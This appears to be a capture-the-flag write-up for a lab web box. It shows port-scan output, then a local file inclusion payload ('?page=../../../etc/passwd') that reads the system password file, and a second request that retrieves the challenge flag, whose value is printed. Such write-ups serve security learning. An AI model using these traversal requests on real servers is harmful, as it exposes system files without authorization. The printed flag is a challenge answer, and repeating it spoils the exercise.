@@ -1,0 +1,137 @@
+ip address:10.10.215.126
+
+RUSTSCAN:
+
+ustscan -a 10.10.215.126
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Port scanning: Making networking exciting since... whenever.
+
+[~] The config file is expected to be at "/home/gabi/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 10.10.215.126:22
+Open 10.10.215.126:80
+[~] Starting Script(s)
+[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-24 02:58 EDT
+Initiating Ping Scan at 02:58
+Scanning 10.10.215.126 [4 ports]
+Completed Ping Scan at 02:58, 0.11s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 02:58
+Completed Parallel DNS resolution of 1 host. at 02:59, 13.00s elapsed
+DNS resolution of 1 IPs took 13.00s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
+Initiating SYN Stealth Scan at 02:59
+Scanning 10.10.215.126 [2 ports]
+Discovered open port 80/tcp on 10.10.215.126
+Discovered open port 22/tcp on 10.10.215.126
+Completed SYN Stealth Scan at 02:59, 0.11s elapsed (2 total ports)
+Nmap scan report for 10.10.215.126
+Host is up, received echo-reply ttl 63 (0.091s latency).
+Scanned at 2025-04-24 02:59:07 EDT for 0s
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 62
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 13.30 seconds
+           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
+
+
+
+NMAP:
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 53:03:f1:87:df:03:fe:aa:42:be:0c:d8:ac:2a:d5:1f (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9zIgVpXfPsBo7qXGGAda3hFOpGR7WW//c3wXl4UUxkPKTCqB6Q0h3UKfQ2a5YOQlkZDFykD9/At3ciPiTGel0GGQSSHW6JxxF7dy4Cc6vsGT8sabJKXi1hCE0KPEnmguxVt2A50Oy2rwD1iXsDEdUCtpBF0JRbA/mhCtfq/v19IB5ppPRwvehJSayWvvOZ152JG+p/Ygw9ILrZDaYcR5IlAwu1Gs/ApJ5+tdPCTbtavX2HVxSz3eKVgGauDj4IOuAk2MsILWNl6Lqew+qA7+Z7S7yccyeMidzvi3dYUlnbk5QTuk7swc+RQcLSEFKgefB/PjgwTILhQCJz8zA6LzVNr0mrgJGL0eSJIlKc+GdFAf9TWtD3qW7ianDyqc2dRtxRC89HWWG4wtS7UXG2ck/Tm+feO1bg+kuWA0Spx2ScPctwmXGBav8t40StboeOwX+ArygaJLrz4k0X4hdgYy69YcOgH0tIJtVYs61yuzopOwN2Jw0KS92eZFwkmUGbfU=
+|   256 0b:79:46:46:83:57:3e:dd:21:d7:f9:b5:b9:08:ab:a8 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMjHfj5NpIWf6m8vO2T9qrH4Dw83oyPhLtPYKEAE0xDQk9reVdvOJMsPvnp2ql6t//TzVamV+ArqFqlWQ5smm+U=
+|   256 0e:10:ae:18:97:ab:ab:07:dd:e6:d9:29:3e:d3:68:3b (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOWtUGzZtGVYKqJuz1nFopoc0tNs5ca3lrCmYLtsiYVp
+80/tcp open  http    syn-ack ttl 62 Apache httpd 2.2.22 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Lo-Fi Music
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=4/24%OT=22%CT=1%CU=38811%PV=Y%DS=2%DC=T%G=Y%TM=6809
+OS:E167%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=110%TI=Z%CI=Z%TS=A)SEQ(S
+OS:P=103%GCD=1%ISR=110%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW
+OS:7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%
+OS:W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508N
+OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
+OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
+OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
+OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
+OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 38.066 days (since Mon Mar 17 01:24:14 2025)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=259 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 993/tcp)
+HOP RTT      ADDRESS
+1   90.52 ms 10.8.0.1
+2   90.57 ms 10.10.215.126
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 02:59
+Completed NSE at 02:59, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 02:59
+Completed NSE at 02:59, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 02:59
+Completed NSE at 02:59, 0.00s elapsed
+Read data files from: /usr/share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.18 seconds
+           Raw packets sent: 1228 (58.122KB) | Rcvd: 1179 (50.638KB)
+
+
+
+Visiting the page on port 80, I've noticed that there is an LFI when nagigating to /relax.
+
+we can now read the etc/passwd file:
+
+http://10.10.215.126/?page=../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash 
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh 
+sync:x:4:65534:sync:/bin:/bin/sync 
+games:x:5:60:games:/usr/games:/bin/sh 
+man:x:6:12:man:/var/cache/man:/bin/sh 
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+ mail:x:8:8:mail:/var/mail:/bin/sh 
+ news:x:9:9:news:/var/spool/news:/bin/sh 
+ uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh 
+ proxy:x:13:13:proxy:/bin:/bin/sh 
+ www-data:x:33:33:www-data:/var/www:/bin/sh 
+ backup:x:34:34:backup:/var/backups:/bin/sh 
+ list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats
+ Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh 
+ libuuid:x:100:101::/var/lib/libuuid:/bin/sh 
+
+
+
+
+Flag:
+visit: http://10.10.215.126/?page=../../../flag.txt
+
+flag{e4478e0eab69bd642b8238765dcb7d18} 
+
+
+
